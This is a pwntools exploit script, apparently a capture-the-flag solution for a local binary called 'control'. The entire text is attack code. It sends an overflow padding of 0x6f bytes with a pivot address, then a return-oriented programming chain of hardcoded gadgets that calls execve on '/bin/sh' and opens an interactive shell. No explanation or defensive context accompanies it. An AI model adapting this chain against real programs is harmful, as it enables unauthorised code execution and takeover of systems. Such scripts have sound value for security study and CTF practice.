from pwn import*

context.update(arch="amd64", os="linux", log_level="debug")
context.terminal = ["qterminal", "-e"]
ret=p64(0x402238)
pop_rdi=p64(0x401c72)
pop_rsi=p64(0x405285)
pop_rdx=p64(0x401aff)
pop_rax=p64(0x462c27)
syscall=p64(0x040161e)


p=process('./control')
def debug():
    gdb.attach(p)

gdb.attach(p,'b* 0x402164')
p.recvuntil('>')
p.sendline(p64(0x4D3350)+p64(0x402164))
sleep(0.1)
p.recvuntil('?')
Rop=pop_rdi+p64(0x4D4C00+0x38)+pop_rsi+p64(0)+pop_rdx+p64(0)+pop_rax+p64(59)+syscall+b'/bin/sh\x00'
p.sendline(b'a'*0x6f+p64(0x4D3350))
p.recvuntil(b'?')
sleep(0.1)
payload=p64(0)+Rop
p.sendline(payload)
sh=b'/bin/sh\x00'
p.interactive()